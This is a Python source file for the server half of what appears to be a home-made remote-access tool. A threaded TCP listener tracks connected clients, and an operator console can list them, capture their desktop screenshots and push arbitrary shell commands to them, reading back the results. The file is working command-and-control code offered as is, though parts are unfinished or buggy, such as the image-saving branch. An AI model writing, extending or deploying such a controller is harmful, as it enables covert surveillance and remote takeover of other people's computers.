import socketserver
import threading
import re
import base64
from datetime import datetime

# SockerServer example used at https://docs.python.org/3/library/socketserver.html
# Threads is used to run multiple I/O-bound tasks simultaneously, here, requests

# Global dic to track connected clients and their sockets
# Needs to be refactored, Explore the Reactor Pattern in the future
connected_clients = {}


# Override class socketserver.BaseRequestHandler : https://docs.python.org/3/library/socketserver.html#socketserver.BaseRequestHandler
class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    """
    It is instantiated once per connection to the server, and must
    override the handle() method to implement communication to the client.
    """
    

    def setup(self) :
        print(f'\nNew client connection : {self.client_address}')
        connected_clients[self.client_address] = self.request # storing the socket
        # print(f'Threads alive : {threading.active_count()}') # Debug purpose

    def handle(self):
        if (self.client_address[0] not in WHITE_LIST) :
            print('IP not in the WhiteList')
            return
        
        HEADER_LENGTH = 4 # Header will always be 4 bytes long
        data_size = 0 # text is sent over 1024 bytes and images over multiple 8192 bytes long

        try :
            while True : # Keep the connection Open
                header = self.request.recv(HEADER_LENGTH).strip()
                data_size = int.from_bytes(header, 'little')

                if data_size == 8192: # Assume for now it's img - Refactor : check for <START balise 
                    deliminer_found = False
                    img = b''
                    while not deliminer_found :
                        packet : str = self.request.recv(data_size).strip().decode('utf-8')
                        start_check = packet.startswith('<START')
                        deliminer_found = packet.endswith('END>')
                        if deliminer_found :
                            packet = packet.removesuffix('END>')
                        if start_check:
                            packet =  packet.removeprefix('<START')
                        img += packet.encode('utf-8')
                        
                        b64_to_txt(img) # DEBUG

                    with open('./screenshots/SAVED.jpg', 'wb') as fs:
                        fs.write(base64.decodebytes(self.data))

                else :
                    self.data = self.request.recv(data_size).strip()
                    message = self.data.decode('utf-8')
                    print(f'{self.client_address} > ' + message)

                    # send alive ping back
                    if (message == 'First connection ping'):
                        self.request.sendall(b'Alive ping back received')
                
        except ConnectionAbortedError :
            print('Connection was aborted by the local system')
        except ConnectionResetError :
            pass # Connection was forcibly closed by the remote host
    

    def finish(self) :
        print(f'\nConnection closed for: {self.client_address}')
        del connected_clients[self.client_address]

# The threaded version let multiple clients connect at the same time.
# They can both communicate in a continuous Stream
class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """This server will handle each request in a new thread."""
    # This ensures that the server can be interrupted and shut down even if there are active client connections.
    daemon_threads = True
    

def read_white_list():
    with open('white_list.txt', 'r') as file:
        whitelist = {line.strip() for line in file if line.strip()}
    return whitelist


def central_commands():
    exit = False
    list_commands_available()

    try :
        while not exit:
            print('\nWaiting for a command, exit to close the server')
            msg = input('> ')

            if msg == 'exit':
                    exit = True
                    break
            
            menu_option = msg.split(' ')[0]
            if menu_option == 'help':
                list_commands_available()
            elif menu_option == 'list':
                print_clients()
            elif menu_option == 'send_echo':
                send_echo(msg)
            elif menu_option == 'get_SC':
                get_SC(msg)
            elif menu_option == 'shell':
                send_shell(msg)
            elif menu_option == '':
                pass
            else :
                print('Command not recognized')

    except KeyboardInterrupt:
        print('Central commands terminated')


def list_commands_available():
    print('\nhelp : List all the commands available')
    print('list : To list clients connected to the server')
    print('send_echo [clientIP@port] ["message"]')
    print('get_SC [clientIP@port] : Get a ScreenShot of the client Desktop')
    print('shell [clientIP@port] [Shell Command] : Send a Shell command to the client and get the result')


def print_clients():
    if len(connected_clients) == 0: 
        print('No clients connected')
    else :
        print('Clients : ')
        for client in connected_clients:
            print(f'{client[0]}@{client[1]}')


# REFACTOR : Verify that the socket is not closed, share the method from client
def get_client(msg: str):
    """ Return socket.socket object """

    client_ip, client_port = msg.split(' ')[1].split("@")
    client_port = int(client_port)
    # print(f'Client : {client_ip} @ {client_port} and msg : {echo_msg}')

    for client in connected_clients:
        if client[0] == client_ip and client[1] == client_port:
            return connected_clients.get(client)
    
    print(f'Client {client_ip}@{client_port} is not is the list of connected client')
    return None


def send_echo(msg: str) :
    client_socket = get_client(msg)
    echo_msg = msg.split('\"')[1].replace('\"', "")

    command = f"echo {echo_msg}"
    print(f'echo {echo_msg} sent')
    client_socket.sendall(command.encode('utf-8'))


def get_SC(msg: str):
    client_socket = get_client(msg)

    if client_socket:
        command = 'screenshot'
        client_socket.sendall(command.encode('utf-8'))


# Add more examples
# REFACTOR Do some verification on the user input
def send_shell(msg: str):
    """ Usage : shell 127.0.0.1@57693 powershell ls -n"""

    client_socket = get_client(msg)
    command = re.split('@\d+ ', msg)[1] # Do some join if there's more than 1 @
    print(f'Command : {command} sent')

    client_socket.sendall(command.encode('utf-8')) 
    # The Data back is caught by the open loop Handler

def b64_to_txt(b64):
    with open('img_b64_server.txt', 'wb') as fs:
        fs.write(b64)

if __name__ == '__main__':
    HOST, PORT = 'localhost', 5000
    WHITE_LIST = read_white_list()
    
    try :
        with ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler) as server : 
            print('--------------------------------------------')
            print(f'Server Hosting @ : {HOST}:{PORT}')
            print('--------------------------------------------')

            # Run the server in a separate thread to control it from the main thread
            server_thread = threading.Thread(target=server.serve_forever) # In a loop, Handling one request at a time until shutdown. (CTL+C) 
            server_thread.daemon = True
            server_thread.start()

            # Listen from incoming commands from the server operator
            central_commands()

            server.shutdown()
            server.server_close()

    except KeyboardInterrupt:
        print('Server terminated')
        server.shutdown()
        server.server_close()